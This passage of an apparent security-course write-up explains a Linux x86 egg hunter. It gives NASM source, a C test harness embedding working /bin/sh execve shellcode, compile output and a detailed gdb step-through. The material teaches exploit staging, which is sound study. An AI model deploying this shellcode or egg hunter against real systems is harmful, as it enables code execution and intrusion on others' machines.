@@ -173,3 +173,691 @@ scasd
 jne increment_address		
 jmp edi
 ```
+
+
+### egghunter.nasm
+Below is egghunter.nasm in its entirety.
+```nasm
+;egghunter.nasm
+;this egg hunter uses the access system call and EFAULT flag to reliably search for an egg in the virtual memory address space for an arbitrary process
+;Linux x86
+;Sanjiv Kawa (@skawasec)
+;www.popped.io
+;Decemeber 4, 2016
+
+global _start
+
+section .text
+
+_start:
+  cld ;clearing the direction flag to prevent the egg hunter from failing as the scas instruction is used
+  xor eax, eax  ;clearing out eax
+  xor edx, edx  ;clearing out edx
+
+next_page:
+  ;the first address of relevance is typically 0x8048000
+  ;however this egg hunter does not assume that the virtual memory address space for the given process follows conventional memory address spaces
+  ;as such, the first memory address that is examined is 0x0001000
+  or dx, 0xfff  ;page alignment
+
+increment_address:
+  inc edx ;increment the value in edx by 1
+  lea ebx, [edx +0x4]	;add 4 to the value in edx and place this value into ebx
+
+  ;at this point ebx contains the value in edx +4, this value represents a memory address we want to access
+  ;ebx contains the single argument that is required by the access syscall, a memory address
+
+  mov eax, 0x21		;move the access system call number, 33, into eax
+  int 0x80		    ;execute system call and attempt to access the memory address currently specified by ebx
+
+search_vas:
+  ;the return value of the access system call is stored in al
+  ;0xf2 represents the low byte of the `EFAULT` return value
+  ;if this value exists in al, then the access system call attempted to access an invalid memory address
+  ;as such, the zero flag will be set
+  cmp al, 0xf2
+
+  ;if the zero flag is set due to an invalid memory location, simply move to the next page
+  je next_page
+
+  ;otherwise, move the egg into eax
+  ;eax is one of the native IA-32 instructions for doing string based comparisons with scas
+  mov eax, 0x534B534B ;SKSK
+
+  mov edi, edx  ;move the memory address currently in edx into edi as the edi register is used by scas
+
+  ;compare the contents of memory stored in edi against the the dword value stored in eax
+  ;this will essentially examine the contents of edi for the egg located in eax
+  scasd
+
+  ;if the contents of edi do not match the contents of eax, esentially meaning that the egg has not been found
+  ;then increment to the next address
+  jne increment_address
+
+  ;if the contents of edi matches the contents of eax, the zero flag will be set, thus bypassing the previous instruction
+  ;scasd will increment the value in edi by 4 bytes
+  ;thus moving to the memory address of the next egg, 4 bytes before before the start of the shellcode
+
+  ;compare the contents of memory stored in edi against the the dword value stored in eax
+  ;this will essentially examine the contents of edi for the egg located in eax
+  scasd
+
+  ;if the contents of edi do not match the contents of eax, esentially meaning that the egg has not been found
+  ;then increment to the next address
+  jne increment_address
+
+  ;if the contents of edi matches the contents of eax, the zero flag will be set, thus bypassing the previous instruction
+  ;scasd will increment the value in edi by 4 bytes
+  ;thus moving to the memory address at start of the shellcode
+
+  jmp edi ;jump to the memory address where the second stage exists and pass control to the shellcode
+```
+
+The egg hunter can be found <a href="https://github.com/skahwah/slae/blob/master/assignment3/egghunter.nasm">here</a>.
+
+
+### The Test Program
+As mentioned above, I have created a "test" program written in C. This uses the egg hunter to traverse the virtual memory address space for the "test" process for a user supplied egg.
+
+```c
+/*
+Egg Hunter for Linux x86
+Sanjiv Kawa (@skawasec)
+www.popped.io
+December 4, 2016
+*/
+
+#include<stdio.h>
+#include<string.h>
+
+#define EGG "\x4b\x53\x4b\x53" //SKSK
+
+char egg[] = EGG;
+
+unsigned char egg_hunter[] = \
+                              "\xfc"	   	           	// cld
+                              "\x31\xc0"	           	// xor eax,eax
+                              "\x31\xd2"          		// xor ebx,ebx
+                              "\x66\x81\xca\xff\x0f"	// or dx,0xfff
+                              "\x42"		            	// inc edx
+                              "\x8d\x5a\x04"       		// lea ebx,[edx+0x4]
+                              "\xb8\x21\x00\x00\x00"	// mov eax,0x21
+                              "\xcd\x80"		          // int 0x80
+                              "\x3c\xf2"		          // cmp al,0xf2
+                              "\x74\xec"		          // je next_page
+                              "\xb8" EGG		          // mov EGG
+                              "\x89\xd7"		          // mov edi,edx
+                              "\xaf"			            // scasd
+                              "\x75\xe7"		          // jne increment_address
+                              "\xaf"			            // scasd
+                              "\x75\xe4"		          // jne increment_address
+                              "\xff\xe7";		          // jmp edi
+
+
+unsigned char second_stage[] = \
+                                EGG
+                                EGG
+                                "\x31\xc0\x50\x68\x6e\x2f\x73\x68"
+                                "\x68\x2f\x2f\x62\x69\x89\xe3\x50"
+                                "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; // /bin/sh execve-stack
+
+main()
+{
+  printf("[+] Searching for: %s\n", EGG);
+  printf("[+] Egg Hunter Length: %d\n", strlen(egg_hunter));
+  printf("[+] Shellcode Length: %d\n", strlen(second_stage));
+  int (*ret)() = (int(*)())egg_hunter;
+  ret();
+}
+```
+
+The test program can be found <a href="https://github.com/skahwah/slae/blob/master/assignment3/egghunter-test.c">here</a>.
+
+Execution of the egg hunter can be examined in `gdb` after linking, assembling and extracting the opcodes from the egg hunter and placing them into the test program is done.
+
+Before this examining the egg hunter in `gdb`, it is a good idea to test if the program executes as expected.
+
+```shell
+skawa@ubuntu:~/Desktop/code/assignment/assignment3$ ls
+compile.sh  egghunter.nasm  shellcode.c
+skawa@ubuntu:~/Desktop/code/assignment/assignment3$ ./compile.sh egghunter
+[+] Assembling with Nasm
+[+] Linking
+[+] Extracting Opcodes
+"\xfc\x31\xc0\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\xb8\x21\x00\x00\x00\xcd\x80\x3c\xf2\x74\xec\xb8\x4b\x53\x4b\x53\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
+skawa@ubuntu:~/Desktop/code/assignment/assignment3$ vim shellcode.c
+skawa@ubuntu:~/Desktop/code/assignment/assignment3$ cat shellcode.c | grep "hunter\[\]" -A 18
+unsigned char egg_hunter[] = \
+                              "\xfc"	   	           	// cld
+                              "\x31\xc0"	           	// xor eax,eax
+                              "\x31\xd2"          		// xor ebx,ebx
+                              "\x66\x81\xca\xff\x0f"	// or dx,0xfff
+                              "\x42"		            	// inc edx
+                              "\x8d\x5a\x04"       		// lea ebx,[edx+0x4]
+                              "\xb8\x21\x00\x00\x00"	// mov eax,0x21
+                              "\xcd\x80"		          // int 0x80
+                              "\x3c\xf2"		          // cmp al,0xf2
+                              "\x74\xec"		          // je next_page
+                              "\xb8" EGG		          // mov EGG
+                              "\x89\xd7"		          // mov edi,edx
+                              "\xaf"			            // scasd
+                              "\x75\xe7"		          // jne increment_address
+                              "\xaf"			            // scasd
+                              "\x75\xe4"		          // jne increment_address
+                              "\xff\xe7";		          // jmp edi
+
+skawa@ubuntu:~/Desktop/code/assignment/assignment3$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+skawa@ubuntu:~/Desktop/code/assignment/assignment3$ ./shellcode
+[+] Searching for: KSKS
+[+] Egg Hunter Length: 16
+[+] Shellcode Length: 33
+$ exit
+skawa@ubuntu:~/Desktop/code/assignment/assignment3$
+```
+
+### Stepping through the execution
+A hook-stop has been defined to keep an eye on the state of the different general purpose registers, eflags as well as the contents of the `EDI` register
+
+```nasm
+skawa@ubuntu:~/Desktop/code/assignment/assignment3$ gdb -q ./shellcode
+Reading symbols from /home/skawa/Desktop/code/assignment/assignment3/shellcode...(no debugging symbols found)...done.
+(gdb) break *&egg_hunter
+Breakpoint 1 at 0x804a060
+(gdb) run
+Starting program: /home/skawa/Desktop/code/assignment/assignment3/shellcode
+[+] Searching for: KSKS
+[+] Egg Hunter Length: 16
+[+] Shellcode Length: 33
+
+Breakpoint 1, 0x0804a060 in egg_hunter ()
+(gdb) define hook-stop
+Type commands for definition of "hook-stop".
+End with a line saying just "end".
+>print/x $eax
+>print/x $ebx
+>print/x $edx
+>print/x $edi
+>x/4bx $edi
+>i r eflags
+>disas
+>end
+(gdb) stepi
+$1 = 0x804a060
+$2 = 0xb7fc6ff4
+$3 = 0x0
+$4 = 0x804a0c2
+0x804a0c2:	0x00	0x00	0x00	0x00
+eflags         0x282	[ SF IF ]
+Dump of assembler code for function egg_hunter:
+   0x0804a060 <+0>:	cld    
+=> 0x0804a061 <+1>:	xor    eax,eax
+   0x0804a063 <+3>:	xor    edx,edx
+   0x0804a065 <+5>:	or     dx,0xfff
+   0x0804a06a <+10>:	inc    edx
+   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
+   0x0804a06e <+14>:	mov    eax,0x21
+   0x0804a073 <+19>:	int    0x80
+   0x0804a075 <+21>:	cmp    al,0xf2
+   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
+   0x0804a079 <+25>:	mov    eax,0x534b534b
+   0x0804a07e <+30>:	mov    edi,edx
+   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a086 <+38>:	jmp    edi
+   0x0804a088 <+40>:	add    BYTE PTR [eax],al
+End of assembler dump.
+0x0804a061 in egg_hunter ()
+(gdb)
+```
+
+As mentioned, the first virtual address space of relevance is typically `0x8048000`, however this egg hunter does not assume that the virtual memory address space for the given process follows conventional means. As such, the first address that is examined is `0x0001000`.
+
+The following disassembly just displays how the page alignment occurs. Until a valid address is located, such as `0x8048000`, the comparison of `AL` and the lower byte of the `EFAULT` flag will always result in the zero flag being set, directing the execution of the process back to the page alignment instruction `dx,0xfff` and incrementing `EBX` and `EBX` by page sizes.
+
+```nasm
+(gdb) break *0x0804a075
+Breakpoint 2 at 0x804a075
+(gdb) c
+Continuing.
+$5 = 0xfffffff2
+$6 = 0x1004
+$7 = 0x1000
+$8 = 0x804a0c2
+0x804a0c2:	0x00	0x00	0x00	0x00
+eflags         0x216	[ PF AF IF ]
+Dump of assembler code for function egg_hunter:
+   0x0804a060 <+0>:	cld    
+   0x0804a061 <+1>:	xor    eax,eax
+   0x0804a063 <+3>:	xor    edx,edx
+   0x0804a065 <+5>:	or     dx,0xfff
+   0x0804a06a <+10>:	inc    edx
+   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
+   0x0804a06e <+14>:	mov    eax,0x21
+   0x0804a073 <+19>:	int    0x80
+=> 0x0804a075 <+21>:	cmp    al,0xf2
+   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
+   0x0804a079 <+25>:	mov    eax,0x534b534b
+   0x0804a07e <+30>:	mov    edi,edx
+   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a086 <+38>:	jmp    edi
+   0x0804a088 <+40>:	add    BYTE PTR [eax],al
+End of assembler dump.
+
+Breakpoint 2, 0x0804a075 in egg_hunter ()
+(gdb)
+Continuing.
+$9 = 0xfffffff2
+$10 = 0x2004
+$11 = 0x2000
+$12 = 0x804a0c2
+0x804a0c2:	0x00	0x00	0x00	0x00
+eflags         0x216	[ PF AF IF ]
+Dump of assembler code for function egg_hunter:
+   0x0804a060 <+0>:	cld    
+   0x0804a061 <+1>:	xor    eax,eax
+   0x0804a063 <+3>:	xor    edx,edx
+   0x0804a065 <+5>:	or     dx,0xfff
+   0x0804a06a <+10>:	inc    edx
+   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
+   0x0804a06e <+14>:	mov    eax,0x21
+   0x0804a073 <+19>:	int    0x80
+=> 0x0804a075 <+21>:	cmp    al,0xf2
+   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
+   0x0804a079 <+25>:	mov    eax,0x534b534b
+   0x0804a07e <+30>:	mov    edi,edx
+   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a086 <+38>:	jmp    edi
+   0x0804a088 <+40>:	add    BYTE PTR [eax],al
+End of assembler dump.
+
+Breakpoint 2, 0x0804a075 in egg_hunter ()
+(gdb)
+Continuing.
+$13 = 0xfffffff2
+$14 = 0x3004
+$15 = 0x3000
+$16 = 0x804a0c2
+0x804a0c2:	0x00	0x00	0x00	0x00
+eflags         0x216	[ PF AF IF ]
+Dump of assembler code for function egg_hunter:
+   0x0804a060 <+0>:	cld    
+   0x0804a061 <+1>:	xor    eax,eax
+   0x0804a063 <+3>:	xor    edx,edx
+   0x0804a065 <+5>:	or     dx,0xfff
+   0x0804a06a <+10>:	inc    edx
+   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
+   0x0804a06e <+14>:	mov    eax,0x21
+   0x0804a073 <+19>:	int    0x80
+=> 0x0804a075 <+21>:	cmp    al,0xf2
+   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
+   0x0804a079 <+25>:	mov    eax,0x534b534b
+   0x0804a07e <+30>:	mov    edi,edx
+   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a086 <+38>:	jmp    edi
+   0x0804a088 <+40>:	add    BYTE PTR [eax],al
+End of assembler dump.
+
+Breakpoint 2, 0x0804a075 in egg_hunter ()
+(gdb)
+```
+
+The following disassembly displays the first valid address that has been located by the `access` system call this is `0x8048004`.
+
+```nasm
+(gdb) del 2
+(gdb) break *0x0804a079
+Breakpoint 3 at 0x804a079
+(gdb) c
+Continuing.
+$65 = 0xfffffffe
+$66 = 0x8048004
+$67 = 0x8048000
+$68 = 0x804a0c2
+0x804a0c2:	0x00	0x00	0x00	0x00
+eflags         0x206	[ PF IF ]
+Dump of assembler code for function egg_hunter:
+   0x0804a060 <+0>:	cld    
+   0x0804a061 <+1>:	xor    eax,eax
+   0x0804a063 <+3>:	xor    edx,edx
+   0x0804a065 <+5>:	or     dx,0xfff
+   0x0804a06a <+10>:	inc    edx
+   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
+   0x0804a06e <+14>:	mov    eax,0x21
+   0x0804a073 <+19>:	int    0x80
+   0x0804a075 <+21>:	cmp    al,0xf2
+   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
+=> 0x0804a079 <+25>:	mov    eax,0x534b534b
+   0x0804a07e <+30>:	mov    edi,edx
+   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a086 <+38>:	jmp    edi
+   0x0804a088 <+40>:	add    BYTE PTR [eax],al
+End of assembler dump.
+
+Breakpoint 3, 0x0804a079 in egg_hunter ()
+(gdb)
+```
+
+The `EDX` register currently hold the value `0x8048000`, which is a particular memory segment. This value is placed into `EDI` and a `scas` performs a string comparison between the `DWORD` value in `EAX`, which is the `egg`, `0x534b534b`, and the value in the memory address in `EDI`, which is `0x7f	0x45	0x4c	0x46`.
+
+```nasm
+(gdb)
+$73 = 0x534b534b
+$74 = 0x8048004
+$75 = 0x8048000
+$76 = 0x8048000
+0x8048000:	0x7f	0x45	0x4c	0x46
+eflags         0x206	[ PF IF ]
+Dump of assembler code for function egg_hunter:
+   0x0804a060 <+0>:	cld    
+   0x0804a061 <+1>:	xor    eax,eax
+   0x0804a063 <+3>:	xor    edx,edx
+   0x0804a065 <+5>:	or     dx,0xfff
+   0x0804a06a <+10>:	inc    edx
+   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
+   0x0804a06e <+14>:	mov    eax,0x21
+   0x0804a073 <+19>:	int    0x80
+   0x0804a075 <+21>:	cmp    al,0xf2
+   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
+   0x0804a079 <+25>:	mov    eax,0x534b534b
+   0x0804a07e <+30>:	mov    edi,edx
+=> 0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a086 <+38>:	jmp    edi
+   0x0804a088 <+40>:	add    BYTE PTR [eax],al
+End of assembler dump.
+0x0804a080 in egg_hunter ()
+(gdb)
+```
+
+As the value in the memory location, `0x8048000`, pointed to by the `EDI` register does not match the value of the egg in the `EAX` register, the zero flag will not be set. This directs the execution of the process back to the `inc edx` instruction which increments the value in the `EDX` by `1`.
+
+The next memory location that is placed into `EDI` is `0x8048001` as the value in `EDX` is assigned into `EDI`.
+
+This process continues until the string comparison conducted by `scas` results in a match, thus setting the zero flag.
+
+```nasm
+(gdb)
+$113 = 0x534b534b
+$114 = 0x8048005
+$115 = 0x8048001
+$116 = 0x8048001
+0x8048001:	0x45	0x4c	0x46	0x01
+eflags         0x206	[ PF IF ]
+Dump of assembler code for function egg_hunter:
+   0x0804a060 <+0>:	cld    
+   0x0804a061 <+1>:	xor    eax,eax
+   0x0804a063 <+3>:	xor    edx,edx
+   0x0804a065 <+5>:	or     dx,0xfff
+   0x0804a06a <+10>:	inc    edx
+   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
+   0x0804a06e <+14>:	mov    eax,0x21
+   0x0804a073 <+19>:	int    0x80
+   0x0804a075 <+21>:	cmp    al,0xf2
+   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
+   0x0804a079 <+25>:	mov    eax,0x534b534b
+   0x0804a07e <+30>:	mov    edi,edx
+=> 0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a086 <+38>:	jmp    edi
+   0x0804a088 <+40>:	add    BYTE PTR [eax],al
+End of assembler dump.
+0x0804a080 in egg_hunter ()
+(gdb)
+```
+
+
+Eventually, the value `0x804a0a0` is loaded from `EDX` into `EDI`.
+
+```
+(gdb)
+$4037 = 0x534b534b
+$4038 = 0x804a0a4
+$4039 = 0x804a0a0
+$4040 = 0x804a0a3
+0x804a0a3 <second_stage+3>:	0x53	0x4b	0x53	0x4b
+eflags         0x206	[ PF IF ]
+Dump of assembler code for function egg_hunter:
+   0x0804a060 <+0>:	cld    
+   0x0804a061 <+1>:	xor    eax,eax
+   0x0804a063 <+3>:	xor    edx,edx
+   0x0804a065 <+5>:	or     dx,0xfff
+   0x0804a06a <+10>:	inc    edx
+   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
+   0x0804a06e <+14>:	mov    eax,0x21
+   0x0804a073 <+19>:	int    0x80
+   0x0804a075 <+21>:	cmp    al,0xf2
+   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
+   0x0804a079 <+25>:	mov    eax,0x534b534b
+=> 0x0804a07e <+30>:	mov    edi,edx
+   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a086 <+38>:	jmp    edi
+   0x0804a088 <+40>:	add    BYTE PTR [eax],al
+End of assembler dump.
+0x0804a07e in egg_hunter ()
+```
+
+A `DWORD` string comparison is conducted between the value in the `EAX` register, which is the `egg`, `0x534b534b`, and the value in the memory address currently pointed to by `EDI`, which is `0x4b	0x53	0x4b	0x53`. As this is a match, the zero flag is set and process will ignore the conditional jump instruction and move on to the following `scas` instruction.
+
+It is important to note, that after the string comparison occurred, the `scas` instruction adds four bytes to the memory location pointed to by `EDI`. As such, `EDI` has been updated from `0x804a0a0` to `0x804a0a4`.
+
+```nasm
+(gdb)
+$4041 = 0x534b534b
+$4042 = 0x804a0a4
+$4043 = 0x804a0a0
+$4044 = 0x804a0a0
+0x804a0a0 <second_stage>:	0x4b	0x53	0x4b	0x53
+eflags         0x206	[ PF IF ]
+Dump of assembler code for function egg_hunter:
+   0x0804a060 <+0>:	cld    
+   0x0804a061 <+1>:	xor    eax,eax
+   0x0804a063 <+3>:	xor    edx,edx
+   0x0804a065 <+5>:	or     dx,0xfff
+   0x0804a06a <+10>:	inc    edx
+   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
+   0x0804a06e <+14>:	mov    eax,0x21
+   0x0804a073 <+19>:	int    0x80
+   0x0804a075 <+21>:	cmp    al,0xf2
+   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
+   0x0804a079 <+25>:	mov    eax,0x534b534b
+   0x0804a07e <+30>:	mov    edi,edx
+=> 0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a086 <+38>:	jmp    edi
+   0x0804a088 <+40>:	add    BYTE PTR [eax],al
+End of assembler dump.
+0x0804a080 in egg_hunter ()
+(gdb)
+$4045 = 0x534b534b
+$4046 = 0x804a0a4
+$4047 = 0x804a0a0
+$4048 = 0x804a0a4
+0x804a0a4 <second_stage+4>:	0x4b	0x53	0x4b	0x53
+eflags         0x246	[ PF ZF IF ]
+Dump of assembler code for function egg_hunter:
+   0x0804a060 <+0>:	cld    
+   0x0804a061 <+1>:	xor    eax,eax
+   0x0804a063 <+3>:	xor    edx,edx
+   0x0804a065 <+5>:	or     dx,0xfff
+   0x0804a06a <+10>:	inc    edx
+   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
+   0x0804a06e <+14>:	mov    eax,0x21
+   0x0804a073 <+19>:	int    0x80
+   0x0804a075 <+21>:	cmp    al,0xf2
+   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
+   0x0804a079 <+25>:	mov    eax,0x534b534b
+   0x0804a07e <+30>:	mov    edi,edx
+   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
+=> 0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a086 <+38>:	jmp    edi
+   0x0804a088 <+40>:	add    BYTE PTR [eax],al
+End of assembler dump.
+0x0804a081 in egg_hunter ()
+(gdb)
+```
+
+
+Taking a look at the source code, is is clear that the memory address `0x804a0a0` pointed to the first `EGG` at the beginning of the shellcode.
+
+After the `scas` instruction added four bytes to `0x804a0a0`, `EDI` has now been incremented to `0x804a0a4` and currently points to the second `EGG` before the start of the shellcode.
+
+```c
+unsigned char second_stage[] = \
+                                EGG
+                                EGG
+                                "\x31\xc0\x50\x68\x6e\x2f\x73\x68"
+                                "\x68\x2f\x2f\x62\x69\x89\xe3\x50"
+                                "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; // /bin/sh execve-stack
+```
+
+
+The same `DWORD` string comparison is conducted between the value in the `EAX` register, which is the `egg`, `0x534b534b`, and the value in the memory address currently pointed to by `EDI`, which is `0x4b	0x53	0x4b	0x53`. As this is a match, the zero flag is set and process will ignore the conditional jump instruction and move on to the following `jmp edi` instruction.
+
+After the string comparison occurred, the `scas` instruction adds four bytes to the memory location pointed to by `EDI`. As such, `EDI` has been updated from `0x804a0a4` to `0x804a0a8` and now points to the beginning of the shellcode after the two egg identifiers.
+
+```nasm
+$4049 = 0x534b534b
+$4050 = 0x804a0a4
+$4051 = 0x804a0a0
+$4052 = 0x804a0a4
+0x804a0a4 <second_stage+4>:	0x4b	0x53	0x4b	0x53
+eflags         0x246	[ PF ZF IF ]
+Dump of assembler code for function egg_hunter:
+   0x0804a060 <+0>:	cld    
+   0x0804a061 <+1>:	xor    eax,eax
+   0x0804a063 <+3>:	xor    edx,edx
+   0x0804a065 <+5>:	or     dx,0xfff
+   0x0804a06a <+10>:	inc    edx
+   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
+   0x0804a06e <+14>:	mov    eax,0x21
+   0x0804a073 <+19>:	int    0x80
+   0x0804a075 <+21>:	cmp    al,0xf2
+   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
+   0x0804a079 <+25>:	mov    eax,0x534b534b
+   0x0804a07e <+30>:	mov    edi,edx
+   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
+=> 0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a086 <+38>:	jmp    edi
+   0x0804a088 <+40>:	add    BYTE PTR [eax],al
+End of assembler dump.
+0x0804a083 in egg_hunter ()
+(gdb)
+$4053 = 0x534b534b
+$4054 = 0x804a0a4
+$4055 = 0x804a0a0
+$4056 = 0x804a0a8
+0x804a0a8 <second_stage+8>:	0x31	0xc0	0x50	0x68
+eflags         0x246	[ PF ZF IF ]
+Dump of assembler code for function egg_hunter:
+   0x0804a060 <+0>:	cld    
+   0x0804a061 <+1>:	xor    eax,eax
+   0x0804a063 <+3>:	xor    edx,edx
+   0x0804a065 <+5>:	or     dx,0xfff
+   0x0804a06a <+10>:	inc    edx
+   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
+   0x0804a06e <+14>:	mov    eax,0x21
+   0x0804a073 <+19>:	int    0x80
+   0x0804a075 <+21>:	cmp    al,0xf2
+   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
+   0x0804a079 <+25>:	mov    eax,0x534b534b
+   0x0804a07e <+30>:	mov    edi,edx
+   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
+=> 0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a086 <+38>:	jmp    edi
+   0x0804a088 <+40>:	add    BYTE PTR [eax],al
+End of assembler dump.
+0x0804a084 in egg_hunter ()
+```
+
+After performing an unconditional jump to the memory location referenced by the `EDI` register, the execution of the process is redirected to `0x0804a0a8` which contains the first instruction of the `exexve-stack` `/bin/sh` shellcode.
+
+```nasm
+(gdb)
+$4057 = 0x534b534b
+$4058 = 0x804a0a4
+$4059 = 0x804a0a0
+$4060 = 0x804a0a8
+0x804a0a8 <second_stage+8>:	0x31	0xc0	0x50	0x68
+eflags         0x246	[ PF ZF IF ]
+Dump of assembler code for function egg_hunter:
+   0x0804a060 <+0>:	cld    
+   0x0804a061 <+1>:	xor    eax,eax
+   0x0804a063 <+3>:	xor    edx,edx
+   0x0804a065 <+5>:	or     dx,0xfff
+   0x0804a06a <+10>:	inc    edx
+   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
+   0x0804a06e <+14>:	mov    eax,0x21
+   0x0804a073 <+19>:	int    0x80
+   0x0804a075 <+21>:	cmp    al,0xf2
+   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
+   0x0804a079 <+25>:	mov    eax,0x534b534b
+   0x0804a07e <+30>:	mov    edi,edx
+   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
+   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
+   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
+=> 0x0804a086 <+38>:	jmp    edi
+   0x0804a088 <+40>:	add    BYTE PTR [eax],al
+End of assembler dump.
+0x0804a086 in egg_hunter ()
+(gdb)
+$4061 = 0x534b534b
+$4062 = 0x804a0a4
+$4063 = 0x804a0a0
+$4064 = 0x804a0a8
+0x804a0a8 <second_stage+8>:	0x31	0xc0	0x50	0x68
+eflags         0x246	[ PF ZF IF ]
+Dump of assembler code for function second_stage:
+   0x0804a0a0 <+0>:	dec    ebx
+   0x0804a0a1 <+1>:	push   ebx
+   0x0804a0a2 <+2>:	dec    ebx
+   0x0804a0a3 <+3>:	push   ebx
+   0x0804a0a4 <+4>:	dec    ebx
+   0x0804a0a5 <+5>:	push   ebx
+   0x0804a0a6 <+6>:	dec    ebx
+   0x0804a0a7 <+7>:	push   ebx
+=> 0x0804a0a8 <+8>:	xor    eax,eax
+   0x0804a0aa <+10>:	push   eax
+   0x0804a0ab <+11>:	push   0x68732f6e
+   0x0804a0b0 <+16>:	push   0x69622f2f
+   0x0804a0b5 <+21>:	mov    ebx,esp
+   0x0804a0b7 <+23>:	push   eax
+   0x0804a0b8 <+24>:	mov    edx,esp
+   0x0804a0ba <+26>:	push   ebx
+   0x0804a0bb <+27>:	mov    ecx,esp
+   0x0804a0bd <+29>:	mov    al,0xb
+   0x0804a0bf <+31>:	int    0x80
+   0x0804a0c1 <+33>:	add    BYTE PTR [eax],al
+End of assembler dump.
+0x0804a0a8 in second_stage ()
+(gdb)
+```
